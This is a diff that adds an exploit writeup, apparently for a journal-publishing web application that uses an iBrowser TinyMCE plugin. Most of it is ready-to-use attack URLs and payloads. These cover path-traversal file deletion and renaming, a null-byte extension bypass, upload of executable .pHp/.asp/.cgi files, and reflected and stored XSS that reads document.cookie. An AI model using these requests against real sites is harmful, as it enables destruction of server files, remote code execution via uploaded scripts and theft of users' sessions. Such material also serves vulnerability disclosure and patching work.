@@ -1,0 +1,36 @@
+Arbitrary File Deletion:
+http://www.example.com/lib/pkp/lib/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/rfiles.php?lang=en&amp; param=delete|/../../../../../../../../../../../../../../../../../../../temp/file_to_delete
+
+Arbitrary File Renaming:
+http://www.example.com/lib/pkp/lib/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/rfiles.php?lang=en&amp; param=rename|file.jpg|file.php%00.jpg
+http://www.example.com/lib/pkp/lib/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/rfiles.php?lang=en&amp; param=rename|/../../../../../../../../../../../../../../../../../../../tmp/file_to_move|1x.jpg
+
+Arbitrary File Upload:
+Malicious registered user shall start a new Submission:
+http://www.example.com/index.php/[journal]/author/submit/1
+on the second step of the Submission:
+http://www.example.com/index.php/[journal]/author/submit/2?articleId=14
+the user should upload test.pHp, test.asp, test.cgi, test.php3 or test.html file. The uploaded file will be available on the following URL:
+http://www.example.com/files/journals/[journalid]/articles/[articleid]/submission/original/[newfilename]
+The original file name will be changed, however it will be displayed to the user after upload (for example &quot;16-28-1-SM.pHp&quot;). File extension will remain the same.
+
+XSS:
+http://www.example.com/lib/pkp/lib/tinymce/jscripts/tiny_mce/plugins/ibrowser/ibrowser.php?editor=z&amp;callb ack=x;};};alert%2834%29;{{&amp;lang=en
+http://www.example.com/lib/pkp/lib/tinymce/jscripts/tiny_mce/plugin s/ibrowser/ibrowser.php?editor=%27%29;};};alert%2834%29;{{a=x%28%27&amp;callback=iBrowser_callback&amp;a mp;lang=en
+
+On the submissions page URL:
+http://www.example.com/index.php/[journal]/author/submit/3?articleId=[id]
+the attacker should add a malicious code to the &quot;URL&quot; field:
+&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+the XSS will be displayed here:
+http://www.example.com/index.php/[submission]/author/submission/[id]
+
+On the following URL:
+http://www.example.com/index.php/[journal]/author/submit/3?articleId=[id]
+the attacker should inject malicious scripting code to the &quot;Bio Statement&quot; or &quot;Abstract of Submission&quot; fields:
+&lt;img src=&quot;x&quot;/onerror=alert(document.cookie)&gt;
+or (browser specific):
+&lt;img style=&quot;width:expression(alert(document.cookie));&quot;&gt;&lt;/a&gt;
+The stored XSS will be displayed here:
+http://www.example.com/index.php/[submission]/author/submission/[id]
+
